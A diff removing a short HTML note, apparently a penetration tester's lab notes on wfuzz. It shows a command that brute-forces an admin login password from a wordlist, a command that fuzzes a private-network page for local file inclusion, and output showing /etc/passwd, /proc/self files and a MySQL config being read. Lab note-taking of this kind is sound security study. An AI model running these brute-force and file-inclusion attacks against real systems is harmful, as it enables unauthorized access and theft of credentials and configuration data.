@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>wfuzz</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>wfuzz</h1><br/>wfuzz -c -z file,cewlwords.txt -d &quot;username=admin&amp;password=FUZZ&quot; <a href="http://192.168.11.129/login.php">http://192.168.11.129/login.php</a> | grep -v 206<br /><br />wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u <a href="http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z">http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z</a> | grep -v 851 | grep -v 835 &gt; LFIList.txt<br /><br /><a href="file:///usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt">/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</a><br /><br /><br />000001:  C=200     70 L	     104 W	   2319 Ch	  &quot;/etc/passwd&quot;<br />000077:  C=200     96 L	     117 W	   1558 Ch	  &quot;/etc/group&quot;<br />000153:  C=200     42 L	      66 W	    908 Ch	  &quot;/proc/self/cmdline&quot;<br />000191:  C=200     43 L	     115 W	   1147 Ch	  &quot;/proc/self/stat&quot;<br />000229:  C=200     83 L	     164 W	   1622 Ch	  &quot;/proc/self/status&quot;<br />006064:  C=500     38 L	      58 W	    786 Ch	  &quot;/etc/php5/apache2/php.ini&quot;<br />006482:  C=500     38 L	      58 W	    786 Ch	  &quot;/etc/php5/cgi/php.ini&quot;<br />007470:  C=200    170 L	     590 W	   4368 Ch	  &quot;/etc/mysql/my.cnf&quot;<br /></div></body></html>
